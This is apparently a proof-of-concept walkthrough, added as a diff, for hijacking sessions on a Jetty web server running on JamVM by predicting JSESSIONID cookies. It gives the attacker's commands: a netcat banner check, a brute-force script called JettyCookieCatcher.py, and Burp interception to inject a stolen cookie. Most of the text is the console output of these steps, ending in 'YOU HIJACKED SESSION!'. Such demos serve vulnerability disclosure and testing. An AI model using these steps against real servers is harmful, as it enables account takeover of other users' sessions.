@@ -1,0 +1,43 @@
+1. On server launch Jetty on JamVM: jamvm -jar start.jar.
+2. On attacker's machine:
+ - Run burpsuite, change proxy setting in browser.
+ - Turn on response interception switch in burpsuite. 
+ - Check that we faced Jetty server: echo -e "HEAD / HTTP/1.0\n\n" | nc 192.168.66.2 8090
+ - Run brutforcing script: nice -n -18 python ./JettyCookieCatcher.py -f cookie.txt -u  http://192.168.66.2:8090/trackit/trackit -w 12
+
+root@kali64:~/demo3# nice -n -18 python ./JettyCookieCatcher.py -f cookie.txt -u http://192.168.66.2:8090/trackit/trackit -w 12
+freshcookie = 1q1xerl9wzcmj1x9wylkixf8ko
+[.] Got new cookie: JSESSIONID=howyp1io0ogxths5svz3hwxl
+[.] Got new cookie: JSESSIONID=mwfif1jsz2bo1utd7cc1wgov9
+[.] Got new cookie: JSESSIONID=v51z4x6jo19qvvaukngs0b94
+[.] Got new cookie: JSESSIONID=103b87epymiroajnnnigk1klr
+[.] Got new cookie: JSESSIONID=wf9d06v43anl1v6qmt0wfimeq
+[.] Got new cookie: JSESSIONID=112nkwmkwnu8z10r7tphjhg0ls
+[.] Got new cookie: JSESSIONID=4ua47os13g7fnhzowvtcoge6
+[.] Got new cookie: JSESSIONID=z35njz93hmwk1edgnp0sps28x
+
+3. On victim's machine:
+ - Log into web application, go to http://192.168.66.2:8090/trackit/trackit. Use admin/admin credentials.
+
+4. On attacker's machine:
+ - Wait until some cookies are infered Terminate script.
+
+[.] Got new cookie: JSESSIONID=156n4ucx2qdxf1m6go4bf15i8n
+[.] Got new cookie: JSESSIONID=1s3v0f1dneqcv1at4retb2nk0u
+[.] Got new cookie: JSESSIONID=yiueu0s03yskrcyemumfr3gp
+[!] Bingo, '1' cookies in cage.
+[.] Got new cookie: JSESSIONID=ix6npt266j2m1o83zjk8ipxby
+^CTraceback (most recent call last):
+  File "/usr/lib/python2.7/multiprocessing/queues.py", line 266, in _feed
+    send(obj)
+IOError: [Errno 32] Broken pipe
+
+ - Find infered cookies in cookie.txt file.
+
+root@kali64:~/demo3# cat cookie.txt
+JSESSIONID=12ln4lx98bdlcf5fwlrm5nt2b
+
+ - Navigate in browser to http://192.168.66.2:8090/trackit/trackit.
+ - Intercept server response in burp. Paste infered cookie into Set-Cookie header in response. Press 'Forward' in burp, turn off interception.
+
+YOU HIJACKED SESSION!
